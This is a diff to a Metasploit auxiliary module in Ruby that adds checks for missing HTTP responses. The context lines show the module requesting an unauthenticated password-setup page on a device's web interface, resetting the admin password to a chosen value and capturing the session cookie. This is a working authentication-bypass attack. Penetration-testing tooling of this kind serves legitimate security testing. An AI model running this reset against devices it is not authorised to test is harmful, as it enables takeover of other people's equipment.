@@ -54,6 +54,11 @@ class Metasploit3 < Msf::Auxiliary
 			'uri'     => '/xslt?PAGE=A07',
 		}, 25)
 
+		if not res
+			print_error("No response from server")
+			return
+		end
+
 		#check to see if we get HTTP OK
 		if (res.code == 200)
 			print_status("Okay, Got an HTTP 200 (okay) code. Verifying Server header")
@@ -114,7 +119,7 @@ class Metasploit3 < Msf::Auxiliary
 			'uri'     => '/xslt?PAGE=H04',
 		}, 25)
 
-		if ( res.code == 200 and res.body.match(/<title>System Setup - Password<\/title>/i))
+		if ( res and res.code == 200 and res.body.match(/<title>System Setup - Password<\/title>/i))
 			print_status("Found password reset page. Attempting to reset admin password to #{datastore['PASSWORD']}")
 
 			data  = 'PAGE=H04_POST'
@@ -131,7 +136,7 @@ class Metasploit3 < Msf::Auxiliary
 				'data'    => data,
 			}, 25)
 
-			if res.code == 200
+			if res and res.code == 200
 				if (res.headers['Set-Cookie'] and res.headers['Set-Cookie'].match(/(.*); path=\//))
 					cookie= $1
 					print_status("Got cookie #{cookie}. Password reset was successful!\n")
